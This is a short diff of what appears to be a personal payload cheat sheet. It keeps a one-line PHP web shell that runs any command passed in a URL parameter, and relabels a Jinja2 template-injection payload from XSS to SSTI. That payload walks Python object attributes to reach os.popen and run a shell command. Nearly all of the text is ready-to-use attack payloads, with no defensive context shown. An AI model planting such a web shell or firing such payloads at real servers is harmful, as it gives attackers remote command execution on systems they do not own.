@@ -41,4 +41,4 @@ Code For Node ->
     ```php
     <?php system($_GET['cmd']); ?>
     ```
-5. XSS Vuln -> ```{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('ls')|attr('read')()}}```
+5. SSTI Vuln -> ```{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('ls')|attr('read')()}}```
